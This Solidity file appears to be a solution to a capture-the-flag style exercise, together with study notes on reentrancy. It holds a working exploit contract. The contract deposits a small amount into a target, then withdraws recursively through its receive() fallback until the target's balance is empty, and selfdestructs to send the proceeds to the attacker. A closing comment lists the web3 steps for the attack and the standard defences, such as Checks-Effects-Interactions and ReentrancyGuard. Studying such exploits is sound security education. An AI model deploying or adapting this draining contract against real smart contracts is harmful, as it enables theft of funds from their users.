pragma solidity ^0.8.0;

import "10-reEntrance.sol";

contract AttackReentrance {
    Reentrance public reEntranceContract;

    constructor(address _address) {
        reEntranceContract = Reentrance(payable(_address));
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether);
        reEntranceContract.donate{value: 0.001 ether}(address(this));
        reEntranceContract.withdraw(0.001 ether);

        require(address(reEntranceContract).balance == 0, "target balance = 0");
        selfdestruct(payable(msg.sender));
    }

    // called when ReEntrancy sends Ether to this contract
    receive() external payable {
        uint amount = min(0.001 ether, address(reEntranceContract).balance);
        if (amount > 0) {
            reEntranceContract.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }

    function getBablance() public view returns (uint) {
        return address(this).balance;
    }
}

/* 
  TODO LIST
  check contract balance 
    await getBalance(contract.address) > '0.001'
    convert to Wei > web3.utils.toWei('0.001','ether') > '1000000000000000'
  attack with 1000000000000000 wei 

  Result

  In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.
  transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

  Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

  Re-entrancy is a common attack. You should always be prepared for it!

  

  The DAO Hack
  The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.
*/
